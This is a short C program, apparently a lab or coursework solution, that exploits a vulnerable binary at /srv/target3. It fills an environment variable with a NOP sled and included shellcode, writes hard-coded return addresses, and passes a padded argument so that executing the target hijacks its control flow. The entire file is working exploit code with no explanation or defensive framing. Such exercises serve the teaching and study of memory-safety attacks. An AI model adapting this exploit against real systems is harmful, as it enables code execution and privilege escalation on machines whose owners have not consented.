#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"
#define ENV_SIZE 400
#define BASE_ADDRESS 0xffffdec0
#define NOP_SLED_SIZE 201
#define NOP 0x90
#define RET_ADDR_OFFSET 4

const uint32_t START_ADDRESS = BASE_ADDRESS + RET_ADDR_OFFSET;
const uint32_t SECOND_ADDRESS = BASE_ADDRESS + 2 * RET_ADDR_OFFSET;
const char PADDING[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";

void prepareEnvironment(char *environment) {
    memset(environment, NOP, ENV_SIZE - 1);
    *((uint32_t *)(environment)) = START_ADDRESS;
    *((uint32_t *)(environment + RET_ADDR_OFFSET)) = SECOND_ADDRESS;
    memcpy(environment + NOP_SLED_SIZE, shellcode, sizeof(shellcode) - 1);
    environment[ENV_SIZE - 1] = '\0';
}

int main(void) {
    char *arguments[] = {TARGET, PADDING, NULL};
    static char environment[ENV_SIZE];

    prepareEnvironment(environment);

    char *env[] = {environment, NULL};

    if (execve(TARGET, arguments, env) == -1) {
        perror("execve failed");
    }

    return EXIT_FAILURE; // If execve fails, the return will be reached.
}
